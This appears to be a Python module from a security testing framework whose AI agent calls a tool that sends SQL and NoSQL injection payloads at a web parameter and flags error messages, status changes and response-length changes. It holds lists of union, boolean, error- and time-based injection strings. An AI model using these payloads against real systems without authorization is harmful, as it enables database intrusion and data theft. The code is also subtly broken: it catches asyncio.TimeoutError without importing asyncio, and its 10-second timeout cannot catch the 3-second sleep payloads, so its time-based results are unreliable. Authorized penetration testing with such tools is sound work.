"""SQL injection testing tools."""

import json
import re
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import aiohttp
import structlog

from sentinel.core.tools import ToolParameter, tool_schema
from sentinel.tools.base import ToolOutput, timed
from sentinel.tools.http_tool import get_session
from sentinel.logging_config import get_logger

logger = get_logger(__name__)

# SQL injection payloads organized by technique
SQLI_PAYLOADS = {
    "error_based": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "1' AND 1=CONVERT(int, (SELECT @@version))--",
        "' UNION SELECT NULL--",
        "') OR ('1'='1",
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    ],
    "blind_boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:3'--",
        "' OR SLEEP(3)--",
        "1' AND (SELECT SLEEP(3))--",
    ],
    "nosql": [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
    ],
}

# Patterns that indicate SQL errors in responses
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_",
    r"valid PostgreSQL result",
    r"SQLite.*error",
    r"sqlite3\.OperationalError",
    r"ORA-\d{5}",
    r"Microsoft SQL Server",
    r"ODBC.*Driver",
    r"SQLServer JDBC Driver",
    r"unclosed quotation mark",
    r"syntax error.*SQL",
    r"SQLSTATE",
    r"SequelizeDatabaseError",
    r"knex.*error",
]


@tool_schema(
    name="sql_injection_test",
    description=(
        "Test a URL parameter or form field for SQL injection vulnerabilities. "
        "Sends various SQL injection payloads and analyzes responses for error messages, "
        "behavior differences, or data leakage that indicates SQL injection. "
        "Returns which payloads triggered suspicious behavior and why."
    ),
    parameters=[
        ToolParameter("url", "string", "URL to test (e.g. 'http://localhost:3000/rest/products/search?q=test')"),
        ToolParameter("parameter", "string", "Name of the parameter to inject into (e.g. 'q' or 'id')"),
        ToolParameter(
            "method",
            "string",
            "HTTP method for the request",
            required=False,
            enum=["GET", "POST"],
        ),
        ToolParameter(
            "technique",
            "string",
            "SQL injection technique to use",
            required=False,
            enum=["error_based", "union_based", "blind_boolean", "time_based", "nosql", "all"],
        ),
        ToolParameter(
            "auth_header",
            "string",
            "Authorization header value if authenticated access is needed (e.g. 'Bearer eyJ...')",
            required=False,
        ),
    ],
)
@timed
async def sql_injection_test(
    url: str,
    parameter: str,
    method: str = "GET",
    technique: str = "all",
    auth_header: str | None = None,
) -> ToolOutput:
    """Test for SQL injection vulnerabilities."""
    session = await get_session()
    results: list[dict[str, Any]] = []
    vulnerable = False

    # Select payloads
    if technique == "all":
        payloads_to_test = []
        for tech, payloads in SQLI_PAYLOADS.items():
            for p in payloads:
                payloads_to_test.append((tech, p))
    else:
        payloads_to_test = [
            (technique, p) for p in SQLI_PAYLOADS.get(technique, [])
        ]

    # Get baseline response
    headers: dict[str, str] = {}
    if auth_header:
        headers["Authorization"] = auth_header

    baseline_status = 0
    baseline_length = 0
    try:
        parsed = urlparse(url)
        if method == "GET":
            async with session.get(url, headers=headers) as resp:
                baseline_status = resp.status
                baseline_body = await resp.text()
                baseline_length = len(baseline_body)
        else:
            async with session.post(url, headers=headers) as resp:
                baseline_status = resp.status
                baseline_body = await resp.text()
                baseline_length = len(baseline_body)
    except Exception as e:
        return ToolOutput(
            tool_name="sql_injection_test",
            success=False,
            data={},
            error=f"Could not get baseline response: {e}",
        )

    # Test each payload
    for tech, payload in payloads_to_test:
        try:
            if method == "GET":
                # Inject into URL query parameter
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[parameter] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()

                async with session.get(
                    test_url, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    status = resp.status
                    body = await resp.text()
            else:
                # Inject into POST body
                data = {parameter: payload}
                async with session.post(
                    url, data=data, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    status = resp.status
                    body = await resp.text()

            # Analyze response for SQL injection indicators
            findings = []

            # Check for SQL error messages
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    findings.append(f"SQL error pattern matched: {pattern}")

            # Check for significant response differences
            length_diff = abs(len(body) - baseline_length)
            if length_diff > baseline_length * 0.3 and baseline_length > 0:
                findings.append(
                    f"Response length changed significantly: {baseline_length} -> {len(body)} ({length_diff} diff)"
                )

            if status != baseline_status:
                findings.append(
                    f"Status code changed: {baseline_status} -> {status}"
                )

            # Check for data leakage (common database output patterns)
            if re.search(r"\d+\.\d+\.\d+", body) and "version" in body.lower():
                findings.append("Possible database version disclosure")

            if findings:
                vulnerable = True
                results.append(
                    {
                        "technique": tech,
                        "payload": payload,
                        "status": status,
                        "response_length": len(body),
                        "findings": findings,
                        "evidence": body[:500] if any("SQL error" in f for f in findings) else "",
                    }
                )

        except asyncio.TimeoutError:
            if tech == "time_based":
                vulnerable = True
                results.append(
                    {
                        "technique": tech,
                        "payload": payload,
                        "status": "timeout",
                        "findings": ["Request timed out, indicating time-based SQL injection"],
                    }
                )
        except Exception:
            pass  # Skip failed requests

    return ToolOutput(
        tool_name="sql_injection_test",
        success=True,
        data={
            "url": url,
            "parameter": parameter,
            "vulnerable": vulnerable,
            "baseline": {
                "status": baseline_status,
                "response_length": baseline_length,
            },
            "findings": results,
            "payloads_tested": len(payloads_to_test),
            "summary": (
                f"VULNERABLE: {len(results)} payloads triggered suspicious behavior"
                if vulnerable
                else f"No injection found after testing {len(payloads_to_test)} payloads"
            ),
        },
    )
